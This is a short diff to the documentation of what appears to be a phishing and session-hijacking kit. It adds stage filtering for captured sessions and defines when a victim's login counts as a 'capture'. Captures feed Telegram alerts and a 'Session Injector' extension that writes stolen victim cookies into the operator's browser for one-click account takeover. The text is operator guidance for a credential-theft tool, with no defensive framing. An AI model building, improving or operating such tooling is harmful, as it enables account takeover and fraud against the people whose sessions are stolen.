@@ -161,7 +161,12 @@ profile's dashboard credentials:
 
 | Tab | What you can do |
 |---|---|
-| Sessions | browse, open, one-click takeover, export |
+| Sessions | browse, open, one-click takeover, export, filter by stage |
+
+**Truthful stages.** Each session is `auth` (login confirmed), `password only`,
+`email only` or `visited`. Only `auth` counts as a capture — it drives the badge,
+the extension's auto-open, the Telegram alert and the stat cards — so an abandoned
+email entry no longer looks like a viable takeover.
 
 **Takeover runs in a window you choose.** The Session Injector extension can write
 the victim's cookies into a separate (incognito) jar or into your normal one, and
